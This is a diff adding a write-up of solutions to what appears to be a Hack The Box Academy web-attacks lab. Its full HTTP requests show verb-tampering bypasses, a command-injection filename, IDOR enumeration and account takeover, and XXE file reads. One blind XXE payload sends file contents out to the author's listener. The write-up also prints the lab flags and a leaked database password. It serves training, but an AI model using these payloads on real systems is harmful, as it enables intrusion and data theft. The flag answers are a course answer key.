@@ -1,0 +1,633 @@
+[Bypassing Basic Authentication]
+
+[*] Target: 134.209.176.83:30033
+
+[Question 1] Try to use what you learned in this section to access the 'reset.php' page and delete all files. Once all files are deleted, you should get the flag.
+
+    - So basically, reset.php can be used to delete all files in the http://134.209.176.83:30033/, but to run it, we must have the authorization, but
+
+        GET /admin/reset.php? HTTP/1.1
+        Host: 134.209.176.83:30033
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Referer: http://134.209.176.83:30033/
+        Upgrade-Insecure-Requests: 1
+
+        => Unauthorized ...
+
+    - In this case, we can change the method to access the reset.php
+
+        1. GET: Retrieves the representation of a resource identified by the provided URL. It should only retrieve data and not have any side effects on the server or resource.
+
+        2. POST: Submits data to be processed by the identified resource. It can be used to create new resources, submit form data, or perform other data processing actions.
+
+        3. PUT: Updates or replaces the representation of a resource at the specified URL with the provided data. It can be used to create or update a resource with a known URL.
+
+        4. DELETE: Deletes the specified resource identified by the provided URL.
+
+        5. PATCH: Partially updates the representation of a resource. It is used to apply partial modifications to a resource, rather than replacing the entire representation.
+
+        6. HEAD: Retrieves the response headers that would be returned for a GET request to the specified resource URL. It is used to obtain metadata about a resource without retrieving its full representation.
+
+        7. OPTIONS: Requests information about the communication options available for the specified resource or server. It is used to determine the allowed methods, supported headers, and other options.
+
+        8. TRACE: Echoes the received request back to the client, allowing the client to see what changes or additions have been made by intermediate servers. It is primarily used for diagnostic or debugging purposes.
+
+    =>  PATCH /admin/reset.php? HTTP/1.1
+        Host: 134.209.176.83:30033
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Referer: http://134.209.176.83:30033/
+        Upgrade-Insecure-Requests: 1
+
+    => HTTP/1.1 200 OK
+        Date: Tue, 06 Jun 2023 04:57:16 GMT
+        Server: Apache/2.4.41 (Ubuntu)
+        Content-Length: 0
+        Connection: close
+        Content-Type: text/html; charset=UTF-8
+
+    => Go back to http://134.209.176.83:30033/ and refresh the webpage => HTB{4lw4y5_c0v3r_4ll_v3rb5}
+
+    [!] Answer: "HTB{4lw4y5_c0v3r_4ll_v3rb5}"
+
+
+[Bypassing Security Filters]
+
+[*] Target: 165.22.113.109:31186
+
+[Question 1] To get the flag, try to bypass the command injection filter through HTTP Verb Tampering, while using the following filename: file; cp /flag.txt ./
+
+    - Go to http://165.22.113.109:31186 then enter the given "filename" 
+
+        GET /index.php?filename=file%3B+cp+%2Fflag.txt+.%2F HTTP/1.1
+        Host: 165.22.113.109:31186
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Referer: http://165.22.113.109:31186/index.php
+        Upgrade-Insecure-Requests: 1
+
+    => Malicious Request Denied!
+
+    - Oke I will change the request to POST method (In burpsuite, you just need to right click ad choose the "Change request method")
+
+        POST /index.php HTTP/1.1
+        Host: 165.22.113.109:31186
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Referer: http://165.22.113.109:31186/index.php
+        Upgrade-Insecure-Requests: 1
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 36
+
+        filename=file%3B+cp+%2Fflag.txt+.%2F
+
+    => click on "flag.txt" file => HTB{b3_v3rb_c0n51573n7}
+
+    [!] Answer: "HTB{b3_v3rb_c0n51573n7}"
+
+
+[Mass IDOR Enumeration]
+
+[*] Target: 134.209.176.83:32434
+
+[Question 1]  Repeat what you learned in this section to get a list of documents of the first 20 user uid's in /documents.php, one of which should have a '.txt' file with the flag.
+
+    - If you go to the http://134.209.176.83:32434/documents.php and refresh the webpage:
+
+        POST /documents.php HTTP/1.1
+        Host: 134.209.176.83:32434
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Referer: http://134.209.176.83:32434/
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 5
+        Origin: http://134.209.176.83:32434
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+        uid=1
+
+    => Oke uid is equal to 1, because if you read the source code in the view-source:http://134.209.176.83:32434/, you will see
+
+        <script>
+            function getDocuments(uid) {
+            $.redirect("/documents.php", {
+                uid: uid,
+            }, "POST", "_self");}
+        </script>
+
+        =>  Now we need to find the flag by changing the uid from 1 to 20, check if there are any other documents among them
+
+    - After brute forcing, I found that uid 15's document contains the flag => HTB{4ll_f1l35_4r3_m1n3}
+
+    [!] Answer: "HTB{4ll_f1l35_4r3_m1n3}"
+
+
+[Bypassing Encoded References]
+
+[*] Target: 64.227.46.56:30376
+
+[Question 1] Try to download the contracts of the first 20 employee, one of which should contain the flag, which you can read with 'cat'. You can either calculate the 'contract' parameter value, or calculate the '.pdf' file name directly.
+
+    - Go to http://64.227.46.56:30376/contracts.php then click on "Employment_contract.pdf"
+
+        GET /download.php?contract=MQ%3D%3D HTTP/1.1
+        Host: 64.227.46.56:30376
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Referer: http://64.227.46.56:30376/contracts.php
+        Upgrade-Insecure-Requests: 1
+
+        => MQ%3D%3D >> URL decoded >> Base64 decoded >> 1
+
+    - After brute forcing (from 1 to 20, remember to add the Base64-encode in the Payload Processing and active the URL-encode at Payload Encoding)
+
+        GET /download.php?contract=MjA%3d HTTP/1.1
+        Host: 64.227.46.56:30376
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Referer: http://64.227.46.56:30376/contracts.php
+        Upgrade-Insecure-Requests: 1
+
+        => HTB{h45h1n6_1d5_w0n7_570p_m3}
+
+    [!] Answer: "HTB{h45h1n6_1d5_w0n7_570p_m3}"
+
+
+[IDOR in Insecure APIs]
+
+[*] Target: 134.209.176.83:31442
+
+[Question 1] Try to read the details of the user with 'uid=5'. What is their 'uuid' value?
+
+    - Go to http://134.209.176.83:31442/profile/index.php:
+
+        GET /profile/api.php/profile/1 HTTP/1.1
+        Host: 134.209.176.83:31442
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: */*
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Referer: http://134.209.176.83:31442/profile/index.php
+        Connection: close
+
+    - After brute-forced the profile number, I found that 
+
+        GET /profile/api.php/profile/5 HTTP/1.1
+        Host: 134.209.176.83:31442
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: */*
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Referer: http://134.209.176.83:31442/profile/index.php
+        Connection: close 
+
+    =>      HTTP/1.1 200 OK
+            Date: Wed, 07 Jun 2023 04:27:20 GMT
+            Server: Apache/2.4.41 (Ubuntu)
+            Vary: Accept-Encoding
+            Content-Length: 177
+            Connection: close
+            Content-Type: text/html; charset=UTF-8
+
+            {
+                "uid":"5",
+                "uuid":"eb4fe264c10eb7a528b047aa983a4829",
+                "role":"employee",
+                "full_name":"Callahan Woodhams",
+                "email":"c_woodhams@employees.htb",
+                "about":"I don't like quoting others!"
+            }
+
+    [!] Answer: "eb4fe264c10eb7a528b047aa983a4829"
+
+
+[Chaining IDOR Vulnerabilities]
+
+[*] Target: 134.209.176.83:31442
+
+[Question 1] Try to change the admin's email to 'flag@idor.htb', and you should get the flag on the 'edit profile' page.
+
+    - In the previous question we found all user's profiles right, look at the uid 10, you can see this is the staff_admin's profile
+
+        HTTP/1.1 200 OK
+        Date: Wed, 07 Jun 2023 04:27:20 GMT
+        Server: Apache/2.4.41 (Ubuntu)
+        Vary: Accept-Encoding
+        Content-Length: 185
+        Connection: close
+        Content-Type: text/html; charset=UTF-8
+
+        {
+            "uid":"10",
+            "uuid":"bfd92386a1b48076792e68b596846499",
+            "role":"staff_admin",
+            "full_name":"admin",
+            "email":"admin@employees.htb",
+            "about":"Never gonna give you up, Never gonna let you down"
+        }
+
+    - After "Update profile" of /profile/api.php/profile/10
+
+        PUT /profile/api.php/profile/1 HTTP/1.1
+        Host: 134.209.176.83:31442
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: */*
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Referer: http://134.209.176.83:31442/profile/index.php
+        Content-type: application/json
+        Origin: http://134.209.176.83:31442
+        Content-Length: 173
+        Connection: close
+        Cookie: role=staff_admin
+
+        {
+            "uid":1,
+            "uuid":"40f5888b67c748df7efba008e7c2f9d2",
+            "role":"employee",
+            "full_name":"admin",
+            "email":"flag@idor.htb",
+            "about":"Never gonna give you up, Never gonna let you down"
+        }
+
+    => Look like we have to fix this a little bit
+
+        PUT /profile/api.php/profile/10 HTTP/1.1
+        Host: 134.209.176.83:31442
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: */*
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Referer: http://134.209.176.83:31442/profile/index.php
+        Content-type: application/json
+        Origin: http://134.209.176.83:31442
+        Content-Length: 173
+        Connection: close
+        Cookie: role=staff_admin
+
+        {
+            "uid":"10",
+            "uuid":"bfd92386a1b48076792e68b596846499",
+            "role":"staff_admin",
+            "full_name":"admin",
+            "email":"flag@idor.htb",
+            "about":"Never gonna give you up, Never gonna let you down"
+        }
+
+        => HTB{1_4m_4n_1d0r_m4573r}
+
+    [!] Answer: "HTB{1_4m_4n_1d0r_m4573r}"
+
+
+[Local File Disclosure]
+
+[*] Target: 10.129.187.129
+
+[Question 1] Try to read the content of the 'connection.php' file, and submit the value of the 'api_key' as the answer.
+
+    - Just go to http://10.129.187.129/ then submit the "Contact Form"
+
+        POST /submitDetails.php HTTP/1.1
+        Host: 10.129.187.129
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: */*
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Content-Type: text/plain;charset=UTF-8
+        Content-Length: 164
+        Origin: http://10.129.187.129
+        Connection: close
+        Referer: http://10.129.187.129/
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <root>
+        <name>thinh</name>
+        <tel>0888888888</tel>
+        <email>thinh@gmail.com</email>
+        <message>nhocvipzcoolngau_9X</message>
+        </root>
+
+    => Check your email thinh@gmail.com for further instructions.
+
+    => Good! so my email has appeared in the output, we can use the XML code shown below to show the connection.php's content in the output instead of the email
+
+        <!DOCTYPE thinh[
+        <!ENTITY random_parameter SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
+        ]>
+
+    =>  POST /submitDetails.php HTTP/1.1
+        Host: 10.129.187.129
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: */*
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Content-Type: text/plain;charset=UTF-8
+        Content-Length: 289
+        Origin: http://10.129.187.129
+        Connection: close
+        Referer: http://10.129.187.129/
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE thinh[
+        <!ENTITY random_parameter SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
+        ]>
+        <root>
+        <name>thinh</name>
+        <tel>0888888888</tel>
+        <email>&random_parameter;</email>
+        <message>nhocvipzcoolngau_9X</message>
+        </root>
+
+    => Check your email PD9waHAKC...sKfQoKPz4K for further instructions.
+
+    <=>     <?php
+
+                $api_key = "UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg";
+                try {
+                    $conn = pg_connect("host=localhost port=5432 dbname=users user=postgres password=iUer^vd(e1Pl9");}
+
+                catch ( exception $e ) {
+                    echo $e->getMessage();} 
+                    
+            ?>
+
+    [!] Answer: "UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg"
+
+
+[Advanced File Disclosure]
+
+[*] Target: 10.129.127.154
+
+[Question 1] Use either method from this section to read the flag at '/flag.php'.
+
+    - Go to http://10.129.127.154/ and submit the "Contact Form"
+
+        POST /submitDetails.php HTTP/1.1
+        Host: 10.129.127.154
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: */*
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Content-Type: text/plain;charset=UTF-8
+        Content-Length: 238
+        Origin: http://10.129.127.154
+        Connection: close
+        Referer: http://10.129.127.154/index.php
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <root>
+        <name>thinh</name>
+        <tel>123456789</tel>
+        <email>thinh@gmail.com</email>
+        <message>thinh</message>
+        </root>
+
+    - Because XML prevents joining internal and external entities so we can't just use the code below to bypass the filter
+
+        <!DOCTYPE email [
+        <!ENTITY start "<![CDATA[">
+        <!ENTITY read_file SYSTEM "file:///flag.php">
+        <!ENTITY end "]]>">
+        <!ENTITY sum "&start;&read_file;&end;">
+        ]>
+
+    - There is another way to bypass this kind of filter
+
+    [Step 1] Create a file that contains the "join" function and open an HTTP port
+
+        # echo '<!ENTITY sum "%start;%read_file;%end;">' > Payload.dtd
+
+        # python3 -m http.server 4444
+
+    [Step 2] Fix the request
+
+            POST /submitDetails.php HTTP/1.1
+            Host: 10.129.127.154
+            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+            Accept: */*
+            Accept-Language: en-US,en;q=0.5
+            Accept-Encoding: gzip, deflate
+            Content-Type: text/plain;charset=UTF-8
+            Content-Length: 238
+            Origin: http://10.129.127.154
+            Connection: close
+            Referer: http://10.129.127.154/index.php
+
+            <?xml version="1.0" encoding="UTF-8"?>
+            <!DOCTYPE email [
+            <!ENTITY % start "<![CDATA[">
+            <!ENTITY % read_file SYSTEM "file:///flag.php">
+            <!ENTITY % end "]]>">
+            <!ENTITY % exploit SYSTEM "http://10.10.16.5:4444/Payload.dtd">
+            %exploit;
+            ]>
+            <root>
+            <name>thinh</name>
+            <tel>123456789</tel>
+            <email>&sum;</email>
+            <message>thinh</message>
+            </root>
+
+        => Check your email <?php $flag = "HTB{3rr0r5_c4n_l34k_d474}"; ?> for further instructions.
+
+    [!] Answer: "HTB{3rr0r5_c4n_l34k_d474}"
+
+
+[Blind Data Exfiltration]
+
+Target: 10.129.182.5
+
+[Question 1] Using Blind Data Exfiltration on the '/blind' page to read the content of '/327a6c4304ad5938eaf0efb6cc3e53dc.php' and get the flag.
+
+    - So now, we need to create a dtd file that is used to transport the 327a6c4304ad5938eaf0efb6cc3e53dc.php's content to our listener
+
+        <!ENTITY % content SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
+        <!ENTITY % sender "<!ENTITY readfile SYSTEM 'http://10.10.16.5:4444/?read=%content;'>">
+
+    ==> I call this file "payload.dtd"
+
+    - Next step, you should open your HTTP port and fix your request a little bit
+
+            POST /blind/submitDetails.php HTTP/1.1
+            Host: 10.129.182.5
+            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+            Accept: */*
+            Accept-Language: en-US,en;q=0.5
+            Accept-Encoding: gzip, deflate
+            Content-Type: text/plain;charset=UTF-8
+            Content-Length: 251
+            Origin: http://10.129.182.5
+            Connection: close
+            Referer: http://10.129.182.5/blind/
+
+            <?xml version="1.0" encoding="UTF-8"?>
+            <!DOCTYPE email [
+            <!ENTITY % exploit SYSTEM "http://10.10.16.5:4444/payload.dtd">
+            %exploit;
+            %sender;
+            ]>
+            <root>
+            <name>thinh</name>
+            <tel>123456789</tel>
+            <email>&readfile;</email>
+            <message>123</message>
+            </root>
+
+        # python3 -m http.server 4444
+        Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
+        10.129.182.5 - - [07/Jun/2023 11:24:09] "GET /payload.dtd HTTP/1.0" 200 -
+        10.129.182.5 - - [07/Jun/2023 11:24:11] "GET /?read=PD9waHAgJGZsYWcgPSAiSFRCezFfZDBuN19uMzNkXzB1N3B1N183MF8zeGYxbDdyNDczX2Q0NzR9IjsgPz4K HTTP/1.0" 200 -
+
+        <=> <?php $flag = "HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}"; ?>
+
+    [!] Answer: "HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}"
+
+
+[Web Attacks - Skills Assessment]
+
+[*] Target: 134.209.176.83:32050
+
+[*] Authenticate to 134.209.176.83:32050 with user "htb-student" and password "Academy_student!"
+
+[Question 1] Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php'.
+
+    - Go to http://134.209.176.83:32050 and log in with the given credential
+
+    - After clicking on "Profile" you can see:
+
+        GET /api.php/user/74 HTTP/1.1
+        Host: 134.209.176.83:32050
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: */*
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Referer: http://134.209.176.83:32050/profile.php
+        Connection: close
+        Cookie: PHPSESSID=i5epjdm4kqi98n6igii2e6sdf3; uid=74
+
+    =>  HTTP/1.1 200 OK
+        Date: Thu, 08 Jun 2023 02:30:24 GMT
+        Server: Apache/2.4.41 (Ubuntu)
+        Vary: Accept-Encoding
+        Content-Length: 90
+        Connection: close
+        Content-Type: text/html; charset=UTF-8
+
+        {"uid":"74","username":"htb-student","full_name":"Paolo Perrone","company":"Schaefer Inc"}
+
+    - You know what to do right =))
+
+    - After brute forcing the uid (from 1 to 500) I found that there are 100 users, and now you should looking for the "admin"
+
+    => Yeah! "GET /api.php/user/52 HTTP/1.1" => {"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}
+
+    => Using this logic flow, we can change the password of the Administrator (just submit the change-password form in "Settings") 
+
+    => After changing the uid, it looks like this
+
+        POST /reset.php HTTP/1.1
+        Host: 134.209.176.83:32050
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: */*
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Referer: http://134.209.176.83:32050/settings.php
+        Content-Type: application/x-www-form-urlencoded
+        Origin: http://134.209.176.83:32050
+        Content-Length: 62
+        Connection: close
+        Cookie: PHPSESSID=i5epjdm4kqi98n6igii2e6sdf3; uid=52
+
+        uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=123
+
+    => But after forwarding this => "Access Denied", let's use the HTTP tampering trick to bypass this
+
+        GET /reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=123 HTTP/1.1
+        Host: 134.209.176.83:32050
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: */*
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Referer: http://134.209.176.83:32050/settings.php
+        Origin: http://134.209.176.83:32050
+        Connection: close
+        Cookie: PHPSESSID=i5epjdm4kqi98n6igii2e6sdf3; uid=52
+
+    => Password changed successfully
+
+    - Good! With this we can use the admin credential a.corrales:123
+
+    - After login as admin, we can see a new function called "ADD EVENT", click on it and submit the event
+
+        POST /addEvent.php HTTP/1.1
+        Host: 134.209.176.83:32050
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: */*
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Referer: http://134.209.176.83:32050/event.php
+        Content-Type: text/plain;charset=UTF-8
+        Origin: http://134.209.176.83:32050
+        Content-Length: 180
+        Connection: close
+        Cookie: PHPSESSID=i5epjdm4kqi98n6igii2e6sdf3; uid=52
+
+        <root>
+        <name>Hung Thinh Tran dep trai pro vip</name>
+        <details>Find da Flag</details>
+        <date></date>
+        </root>
+
+    => Event 'Hung Thinh Tran dep trai pro vip' has been created.
+
+    - Cool! we can use this to read the /flag.php
+
+        POST /addEvent.php HTTP/1.1
+        Host: 134.209.176.83:32050
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: */*
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Referer: http://134.209.176.83:32050/event.php
+        Content-Type: text/plain;charset=UTF-8
+        Origin: http://134.209.176.83:32050
+        Content-Length: 347
+        Connection: close
+        Cookie: PHPSESSID=i5epjdm4kqi98n6igii2e6sdf3; uid=52
+
+        <!DOCTYPE thinhprovip [
+            <!ENTITY read SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
+            ]>
+        <root>
+            <name>&read;</name>
+            <details>Find da Flag</details>
+            <date></date>
+        </root>
+
+    => Event 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' has been created.
+
+    <=> <?php $flag = "HTB{m4573r_w3b_4774ck3r}"; ?>
+
+    [!] Answer: "HTB{m4573r_w3b_4774ck3r}"
